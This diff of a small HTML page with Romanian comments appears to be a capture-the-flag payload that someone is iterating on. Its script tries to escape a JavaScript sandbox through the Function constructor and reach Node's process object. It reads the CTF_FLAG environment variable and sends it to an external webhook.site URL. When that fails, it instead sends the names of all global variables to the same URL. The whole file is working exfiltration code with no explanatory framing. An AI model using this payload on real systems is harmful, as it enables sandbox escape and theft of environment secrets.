@@ -1,18 +1,22 @@
-<!DOCTYPE html>
+<!DOCTYPE html><!DOCTYPE html>
 <html>
 <body>
     <script>
         try {
-            // Încercăm să găsim obiectul global și să forțăm returnarea procesului
-            // folosind constructorul de bază al ierarhiei Node
-            var globalObj = (new Function('return this'))();
-            var p = globalObj.process || (Node.constructor('return process')());
+            // Folosim o metodă de evadare din sandbox prin prototipul funcțiilor
+            const getProcess = Function('return this.process || (this.constructor.constructor("return process")())');
+            const proc = getProcess();
             
-            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG=" + p.env.CTF_FLAG);
+            // Extragem flag-ul
+            const flag = proc.env.CTF_FLAG || "FLAG_NEIDENTIFICAT";
+
+            // Trimitem flag-ul către tine
+            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_FINAL=" + encodeURIComponent(flag));
+            
         } catch (e) {
-            // Dacă tot nu merge, verificăm dacă putem citi măcar proprietățile obiectului Node
-            var keys = Object.keys(Node).join(',');
-            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?DEBUG_KEYS=" + btoa(keys));
+            // Dacă dă eroare, trimitem toate variabilele globale să vedem unde e ascuns flag-ul
+            const globals = Object.keys(window).join(',');
+            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?BACKUP_KEYS=" + btoa(globals));
         }
     </script>
 </body>
